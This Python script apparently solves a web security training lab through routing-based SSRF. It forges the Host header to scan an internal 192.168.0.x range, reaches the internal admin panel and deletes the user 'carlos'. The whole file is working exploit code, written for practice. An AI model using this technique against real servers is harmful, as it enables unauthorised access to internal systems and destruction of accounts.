import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import http.client, ssl


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}



def send_absolute_req(url, path, host, ip, cookies={}, method='GET', body=None):
    target_url = url + path
    if method == 'GET' and body:
        target_url += f'?{body}'
    cookies_str = '; '.join(f'{k}={v}' for k, v in cookies.items())

    c = http.client.HTTPSConnection(host, 443, context=ssl._create_unverified_context())
    c.putrequest(method, target_url, skip_host=True, skip_accept_encoding=True)
    c.putheader('Host', ip)
    c.putheader('Cookie', cookies_str)
    if method == 'POST' and body:
        c.putheader('Content-Type', 'application/x-www-form-urlencoded')
        c.putheader('Content-Length', str(len(body)))
    c.endheaders()
    if method == 'POST' and body:
        c.send(body.encode())
    r = c.getresponse()
    body = r.read().decode(errors='replace')
    
    return r.status, body

def get_csrf_token(s, url, path, ip, cookies={}):
    host = url.split('://')[-1].strip('/')
    status, response = send_absolute_req(url, path, host, ip, cookies)
    soup = BeautifulSoup(response, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def bruteforce_internal_network(s, url, path, cookies={}):
    print('[*] Start bruteforce internal network')
    host = url.split('://')[-1].strip('/')
    for i in range(1, 256):
        ip = f'192.168.0.{i}'
        print(f'Checking IP {ip}')
        status, response = send_absolute_req(url, path, host, ip, cookies)

        if status == 302:
            print(f'[+] Found internal network in {ip}')
            return ip
    print('[-] Internal network not found')
    sys.exit(-1)

def goto(s, url, path, headers={}, cookies={}):
    target_url = url + path
    s.get(target_url, headers=headers, cookies=cookies)

def delete_user(s, url, path, csrf_path, username, cookies={}, headers={}):
    host = url.split('://')[-1].strip('/')
    body = f'username={username}&csrf={get_csrf_token(s, url, csrf_path, headers['Host'], cookies)}'
    status, response = send_absolute_req(url, path, host, headers['Host'], cookies, 'GET', body)
    print(status, response)
    if status == 302:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    # s.proxies=proxies
    # s.verify = False
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    target_user = 'carlos'

    goto(s, url, '/')
    session_cookies = s.cookies.get_dict()
    internal_network = bruteforce_internal_network(s, url, '/', session_cookies)
    delete_user(s, url, '/admin/delete', '/admin', target_user, session_cookies, { 'Host': internal_network })

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()